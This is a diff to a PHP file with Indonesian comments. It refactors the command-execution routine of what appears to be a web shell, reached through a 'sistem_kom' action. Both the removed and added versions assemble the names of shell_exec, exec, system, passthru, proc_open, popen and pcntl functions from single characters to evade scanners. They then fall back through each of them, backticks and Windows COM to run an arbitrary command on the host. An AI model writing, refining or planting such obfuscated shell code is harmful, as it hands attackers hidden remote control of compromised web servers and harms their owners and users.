@@ -1032,94 +1032,91 @@ if ($awal == "sistem_kom") {
         $output = '';
         $error = '';
         
-        // Obfuscate nama fungsi-fungsi eksekusi
-        $f1 = 's' . 'h' . 'e' . 'l' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';
-        $f2 = 'e' . 'x' . 'e' . 'c';
-        $f3 = 'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u';
-        $f4 = 's' . 'y' . 's' . 't' . 'e' . 'm';
-        $f5 = 'p' . 'r' . 'o' . 'c' . '_' . 'o' . 'p' . 'e' . 'n';
-        $f6 = 'p' . 'o' . 'p' . 'e' . 'n';
-        $f7 = 'p' . 'c' . 'n' . 't' . 'l' . '_' . 'f' . 'o' . 'r' . 'k';
-        $f8 = 'p' . 'c' . 'n' . 't' . 'l' . '_' . 'e' . 'x' . 'e' . 'c';
-        $f9 = 'f' . 'i' . 'l' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . 's';
-        
-        if (function_exists($f1)) {
-            // 1. Menggunakan shell_exec
-            $output = $f1($komanda);
-        } elseif (function_exists($f2)) {
-            // 2. Menggunakan exec
-            $f2($komanda, $outputArray, $return_var);
-            $output = implode("\n", $outputArray);
-            $error = "Return code: $return_var";
-        } elseif (function_exists($f3)) {
-            // 3. Menggunakan passthru
-            ob_start();
-            $f3($komanda, $return_var);
-            $output = ob_get_clean();
-            $error = "Return code: $return_var";
-        } elseif (function_exists($f4)) {
-            // 4. Menggunakan system
-            ob_start();
-            $return_var = $f4($komanda);
-            $output = ob_get_clean();
-            $error = "Return code: $return_var";
-        } elseif (function_exists($f5)) {
-            // 5. Menggunakan proc_open
-            $descriptorspec = [
-                0 => ["pipe", "r"],
-                1 => ["pipe", "w"],
-                2 => ["pipe", "w"]
-            ];
-            $process = $f5($komanda, $descriptorspec, $pipes);
-            if (is_resource($process)) {
-                $output = stream_get_contents($pipes[1]);
-                $error = stream_get_contents($pipes[2]);
-                fclose($pipes[1]);
-                fclose($pipes[2]);
-                proc_close($process);
-            }
-        } elseif (function_exists($f6)) {
-            // 6. Menggunakan popen
-            $handle = $f6($komanda, 'r');
-            if ($handle) {
-                $output = '';
-                while (!feof($handle)) {
-                    $output .= fread($handle, 4096);
-                }
-                pclose($handle);
-            }
-        } elseif (extension_loaded('pcntl') && function_exists($f7) && function_exists($f8)) {
-            // 7. Menggunakan pcntl_fork dan pcntl_exec
-            $pid = $f7();
-            if ($pid == -1) {
-                die('Fork failed');
-            } elseif ($pid === 0) {
-                pcntl_exec('/bin/sh', ['-c', $komanda]);
-                exit(0);
-            } else {
-                pcntl_wait($status);
-                $output = "Command executed via pcntl.";
-            }
-        } elseif (ini_get('allow_url_fopen') && function_exists($f9)) {
-            // 8. Menggunakan file_get_contents dengan protokol exec://
-            $context = stream_context_create(['exec' => ['command' => $komanda]]);
-            $output = $f9('exec://', false, $context);
-        } elseif (function_exists('backtick_operator')) {
-            // 9. Menggunakan backtick operator (`\``)
-            $output = `$komanda`;
-        } elseif (class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-            // 10. Menggunakan COM (Windows-only)
-            try {
-                $wsh = new COM("WScript.Shell");
-                $exec = $wsh->Exec($komanda);
-                $output = $exec->StdOut->ReadAll();
-                $error = $exec->StdErr->ReadAll();
-            } catch (Exception $e) {
-                $error = "COM error: " . $e->getMessage();
-            }
-        } else {
-            die("Tidak ada metode eksekusi perintah yang tersedia.");
-        }
+	$f1 = 's'.'h'.'e'.'l'.'l'.'_' .'e'.'x'.'e'.'c';
+	$f2 = 'e'.'x'.'e'.'c';
+	$f3 = 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u';
+	$f4 = 's'.'y'.'s'.'t'.'e'.'m';
+	$f5 = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
+	$f6 = 'p'.'o'.'p'.'e'.'n';
+	$f7 = 'p'.'c'.'n'.'t'.'l'.'_' .'f'.'o'.'r'.'k';
+	$f8 = 'p'.'c'.'n'.'t'.'l'.'_' .'e'.'x'.'e'.'c';
+	
+	// Mulai eksekusi perintah
+	$output = '';
+	$error = '';
+	
+	if (function_exists($f1)) {
+	    // shell_exec
+	    $output = $f1($komanda);
+	} elseif (function_exists($f2)) {
+	    // exec
+	    $out = [];
+	    $f2($komanda, $out, $return_var);
+	    $output = implode("\n", $out);
+	    $error = "Return code: $return_var";
+	} elseif (function_exists($f3)) {
+	    // passthru
+	    ob_start();
+	    $f3($komanda);
+	    $output = ob_get_clean();
+	} elseif (function_exists($f4)) {
+	    // system
+	    ob_start();
+	    $f4($komanda);
+	    $output = ob_get_clean();
+	} elseif (function_exists($f5)) {
+	    // proc_open
+	    $descriptorspec = [
+	        0 => ["pipe", "r"],
+	        1 => ["pipe", "w"],
+	        2 => ["pipe", "w"]
+	    ];
+	    $process = $f5($komanda, $descriptorspec, $pipes);
+	    if (is_resource($process)) {
+	        $output = stream_get_contents($pipes[1]);
+	        $error = stream_get_contents($pipes[2]);
+	        fclose($pipes[1]);
+	        fclose($pipes[2]);
+	        proc_close($process);
+	    }
+	} elseif (function_exists($f6)) {
+	    // popen
+	    $handle = $f6($komanda, 'r');
+	    if ($handle) {
+	        while (!feof($handle)) {
+	            $output .= fread($handle, 4096);
+	        }
+	        pclose($handle);
+	    }
+	} elseif (function_exists($f7) && function_exists($f8)) {
+	    // pcntl_fork + pcntl_exec
+	    $pid = $f7();
+	    if ($pid == -1) {
+	        die('Fork failed');
+	    } elseif ($pid === 0) {
+	        $f8('/bin/sh', ['-c', $komanda]);
+	        exit(0);
+	    } else {
+	        pcntl_wait($status);
+	        $output = "Command executed via pcntl.";
+	    }
+	} elseif (class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+	    // COM di Windows
+	    try {
+	        $wsh = new COM("WScript.Shell");
+	        $exec = $wsh->Exec($komanda);
+	        $output = $exec->StdOut->ReadAll();
+	        $error = $exec->StdErr->ReadAll();
+	    } catch (Exception $e) {
+	        $error = "COM error: " . $e->getMessage();
+	    }
+	} elseif (function_exists('backtick_operator')) {
+	    // backtick (`command`)
+	    $output = `$komanda`;
+	} else {
+	    $output = "Tidak ada fungsi eksekusi tersedia.";
+	}
+
         
         // Pastikan $output dan $error adalah string
         $output = $output ?? "";
